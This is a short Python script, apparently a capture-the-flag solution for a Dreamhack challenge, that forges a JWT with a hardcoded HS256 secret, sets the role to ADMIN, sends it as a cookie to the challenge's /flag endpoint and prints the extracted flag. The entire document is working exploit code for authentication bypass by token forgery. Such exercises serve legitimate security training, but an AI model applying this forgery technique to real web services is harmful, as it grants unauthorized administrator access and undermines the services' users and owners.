import requests
import jwt
import datetime
import json
import re

HOST = "http://host1.dreamhack.games"
PORT = 12345

SECRET_KEY = "nolmyun_muhhanee_butterfly_whitewhale_musicsogood"
token = jwt.encode(
    {
        "username": "",
        "role": "ADMIN",
        "exp": datetime.datetime.now(datetime.UTC) + datetime.timedelta(minutes=10),
    },
    SECRET_KEY,
    algorithm="HS256",
)
res = requests.post(f"{HOST}:{PORT}/flag", json={}, cookies={"token": token})
res = json.loads(res.text)
flag = re.search(r"(0xH0P3\{.*\})", res["flag"])
print(flag.group(1))
